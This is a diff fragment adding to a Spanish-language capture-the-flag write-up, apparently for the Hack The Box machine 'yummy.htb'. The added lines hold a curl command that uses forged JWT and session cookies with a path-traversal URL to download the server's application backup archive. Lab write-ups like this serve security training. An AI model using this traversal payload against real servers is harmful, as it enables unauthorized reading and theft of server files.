@@ -329,3 +329,9 @@ fi
 
 [ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
 ```
+Archivo `/var/www/backupapp.zip`
+
+```bash
+curl -s --cookie 'X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiY3VzdG9tZXJfNWQ1NjIyZTAiLCJpYXQiOjE3NDA0MzM2NjEsImV4cCI6MTc0MDQzNzI2MSwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiIxMDIwNDczNzM3MDQzMjYwNTc5NjMwODc0OTAwMjI2MDM1NTg5OTcxNTg0Nzc5MDM0ODk2ODcwODI4Nzc4OTQzMzc0OTE5NzM1MjQxMTE0Nzk4MjYwMDg1NTI3MjU0MzcyODEyODM2ODExMDUxMzUzMTkyNTgyMTE1NjkwMjE3NDY5MzM5MDAwNTA1NzY5MzAzMTU0ODcyNDkxMjI2MjY3MzY0MDA1OTc1MjY0MzY4MTY4MjYzMjQyODExNzIyMjA0NDM5MzIzOTkyMTQ3MTAwMTUzOTMxODUxMjQ0MjkyNDY3NTkyNDc1ODk0MDMwODIwNjcyMzA2NzU4NjkyMTUzMTk0NzM2NzU5MDM2NjkwMDk5MzUzNjg0MTcxMjg0MjUxMDYxMjYzOTg4MTAwMzcwNDQ2MTc1MTQwMTEiLCJlIjo2NTUzN319.B79xNddXTA4Wv8nONSm5qLeb9WVGzf-l5oCn7ypf2BYpw07PIlXvP4QOR6dpBRPkBEFnbg4wosEBd4gSSI9PsjBYihGOs5LtTuE6NWdkf3SjMaxM6CTXBdFHn0l74PwXjBn4oSJ6FGsnxK9-5DPNWltfdoU_cZSkTudSoQ_pYqpQbGI; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU65GqMrQUAdo0urg.Z7z0-g.QVEAlJv72-mH4aAeX6dV4PxTiXs' -X GET 'http://yummy.htb/export/../../../../../../../var/www/backupapp.zip' --path-as-is --output backupapp.zip
+```
+
